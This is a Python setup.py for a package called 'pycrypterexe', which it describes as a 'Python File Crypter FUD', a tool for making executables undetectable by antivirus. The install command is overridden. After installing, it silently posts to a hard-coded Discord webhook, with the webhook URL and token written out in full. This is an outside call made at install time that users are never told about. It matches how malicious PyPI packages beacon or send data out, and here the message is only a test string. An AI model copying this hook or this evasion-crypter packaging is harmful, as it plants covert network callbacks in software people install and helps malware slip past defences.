import os
import setuptools
from setuptools.command.install import install
import requests
import json


class InstallCommand(install):
    def run(self):
        install.run(self)
        # Call Discord webhook here
        webhook_url = "https://discord.com/api/webhooks/1078733828820054216/4msW5vN4GwhxilN1o-LIdnJOBCxn96xKj_1B5VZ0mQvjd_UOtOUOIDS35n2hNvRKHo0S"
        message = {"content": "funciona"}
        headers = {"Content-Type": "application/json"}
        response = requests.post(webhook_url, data=json.dumps(message), headers=headers)
        if response.status_code != 204:
            print("Failed to send Discord message")
        else:
            print("Discord message sent successfully!")


with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setuptools.setup(
    name="pycrypterexe",
    version="1.0.7",
    author="PyCryptexe",
    author_email="junglebrothers@gmail.com",
    description="Python File Crypter FUD",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/junglebrothers/pycryptexe",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
    cmdclass={
        'install': InstallCommand
    }
)
